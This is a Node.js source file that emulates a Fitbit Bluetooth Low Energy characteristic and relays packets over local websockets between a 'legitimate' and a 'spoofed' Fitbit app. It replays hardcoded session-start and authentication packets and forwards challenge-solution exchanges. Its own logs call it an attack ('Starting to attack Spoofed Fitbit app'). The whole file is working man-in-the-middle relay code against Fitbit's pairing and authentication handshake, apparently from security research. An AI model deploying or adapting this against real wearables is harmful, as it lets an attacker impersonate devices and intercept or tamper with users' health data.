var util = require('util');

var bleno = require('bleno');

const ioc = require("socket.io-client");
const socket0 = ioc("ws://localhost:3000");

const http = require('http').createServer();
const ios = require('socket.io')(3001, 'localhost');

var global_uvc;

ios.on("connection", socket1 => {
	
	console.log("Connected to websocket 3001");
	
	socket1.on("initialize-session", () => {
		console.log("\n---\nWebsocket received packet: c00a0a00180028000000c80001");
		console.log("Sending three start session packets c0 c0 c014 to Fitbit app\n---\n");
		var delayedmsg1 = new Buffer('c0', 'hex');
		setTimeout(goAfterTimeout, 20, delayedmsg1, global_uvc);
		var delayedmsg2 = new Buffer('c0', 'hex');
		setTimeout(goAfterTimeout, 40, delayedmsg2, global_uvc);
		var delayedmsg3 = new Buffer('c0140c0a00008a260ece82e81700', 'hex');
		setTimeout(goAfterTimeout, 60, delayedmsg3, global_uvc);
	});

	socket1.on("initialize-auth", (nonce) => {
		console.log("\n---\nWebsocket received packet: c050" + nonce);
		console.log("Sending challenge packet c051 to Fitbit app\n---\n");
		var delayedmsg1 = new Buffer('c05100abc994bc211b4405000000', 'hex');
		setTimeout(goAfterTimeout, 20, delayedmsg1, global_uvc);
	});

	socket1.on("challenge-solution", (solution) => {
		console.log("\n---\nWebsocket received packet: c052" + solution);
		console.log("Sending challenge packet c002 to Fitbit app\n---\n");
		var delayedmsg1 = new Buffer('c002', 'hex');
		setTimeout(goAfterTimeout, 20, delayedmsg1, global_uvc);
	});

	socket1.on("repeat-c001", () => {
		console.log("\n---\nWebsocket received packet: c001");
		console.log("Sending repeated packet c001 to Fitbit app\n---\n");
		var delayedmsg1 = new Buffer('c001', 'hex');
		setTimeout(goAfterTimeout, 20, delayedmsg1, global_uvc);
	});
	
	socket1.on("fitbit-command", (command) => {
		console.log("\n---\nWebsocket 3001 received command " + command.toString('hex'));
		console.log("Sending " + command.toString('hex') + " to Spoofed Fitbit app\n---\n");
		socket0.emit("fitbit-command", command);
		if (command.toString('hex').substr(0,4) == 'c052') {
			var delayedmsg1 = new Buffer([0xc0, 0x02]);
			setTimeout(goAfterTimeout, 100, delayedmsg1, global_uvc);
		}
	});
	
});

socket0.on("fitbit-notification", (notification) => {
	console.log("\n---\nWebsocket 3000 received notification: " + notification.toString('hex'));
	var delayedmsg1 = new Buffer(notification.toString('hex'), 'hex');
	setTimeout(goAfterTimeout, 2, delayedmsg1, global_uvc);
	console.log("Notification " + notification.toString('hex') + " notified to Legitimate Fitbit app\n---\n");
});

socket0.on("fitbit-info", (info) => {
	console.log("\n---\nWebsocket 3000 received info: " + info.toString('hex'));
	var delayedmsg1 = new Buffer(info.toString('hex'), 'hex');
	setTimeout(goAfterTimeout, 2, delayedmsg1, global_uvc);
	console.log("Info " + info.toString('hex') + " notified to Legitimate Fitbit app\n---\n");
});

function goAfterTimeout(v, uvc) {
	if (uvc) {
      console.log('FitbitAdabfb01Characteristic delayed - onWriteRequest: value = ' + v.toString('hex') + '\n');
      uvc(v);
    }
};

var BlenoCharacteristic = bleno.Characteristic;
var Descriptor = bleno.Descriptor;

var FitbitAdabfb01Characteristic = function() {
	FitbitAdabfb01Characteristic.super_.call(this, {
		uuid: 'ADABFB01-6E7D-4601-BDA2-BFFAA68956BA',
		properties: ['read','notify'],
		value: '',
		descriptor: new Descriptor({
			uuid: '2902',
			value: 'Notifications and indications disabled',
		})
	});
	this._value = new Buffer.from('0000000000000000000000000000000000000000','hex');
};

util.inherits(FitbitAdabfb01Characteristic, BlenoCharacteristic);

FitbitAdabfb01Characteristic.prototype.onReadRequest = function(offset, callback) {
	console.log('FitbitAdabfb01Characteristic - onReadRequest: value = ' + this._value.toString('hex'));
	callback(this.RESULT_SUCCESS, this._value);
};

FitbitAdabfb01Characteristic.prototype.onSubscribe = function(maxValueSize, updateValueCallback) {
	console.log('FitbitAdabfb01Characteristic - onSubscribe');
	this._updateValueCallback = updateValueCallback;
	global_uvc = updateValueCallback;
	console.log("\n---\nStarting to attack Spoofed Fitbit app\n---\n");
	socket0.emit("fitbit-start");
	/*
	var delayedmsg1 = new Buffer('c0','hex');
	setTimeout(goAfterTimeout, 800, delayedmsg1, this._updateValueCallback);
	var delayedmsg2 = new Buffer('c0','hex');
	setTimeout(goAfterTimeout, 820, delayedmsg2, this._updateValueCallback);
	var delayedmsg3 = new Buffer('c0140c0a00008a260ece82e81700','hex');
	setTimeout(goAfterTimeout, 840, delayedmsg3, this._updateValueCallback);
	*/
	
};

FitbitAdabfb01Characteristic.prototype.onUnsubscribe = function() {
	console.log('FitbitAdabfb01Characteristic - onUnsubscribe');
	this._updateValueCallback = null;
};

module.exports = FitbitAdabfb01Characteristic;
